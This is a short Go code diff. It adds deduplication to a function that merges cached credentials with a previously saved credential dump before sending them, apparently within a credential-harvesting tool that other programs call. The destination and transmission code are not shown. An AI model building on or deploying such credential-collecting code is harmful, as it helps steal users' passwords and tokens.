@@ -25,7 +25,10 @@ func sendData(c *cred_cache.CredCache) {
 	previousDump := fetchDump(path)
 	if previousDump != nil {
 		for _, c := range previousDump {
-			creds = append(creds, c)
+			tmp := stringInSlice(c, creds)
+			if tmp != true {
+				creds = append(creds, c)
+			}
 		}
 	}
 	credStr := ""
@@ -43,6 +46,7 @@ func sendData(c *cred_cache.CredCache) {
 		return
 	}
 	c.ClearEntries() // reset credential entries in cache
+	return
 
 }
 
@@ -74,6 +78,15 @@ func fetchDump(path string) []string {
 	}
 
 	return data
+}
+
+func stringInSlice(a string, slc []string) bool {
+	for _, b := range slc {
+		if b == a {
+			return true
+		}
+	}
+	return false
 }
 
 // This function will be called by other programs, checks to see if we have
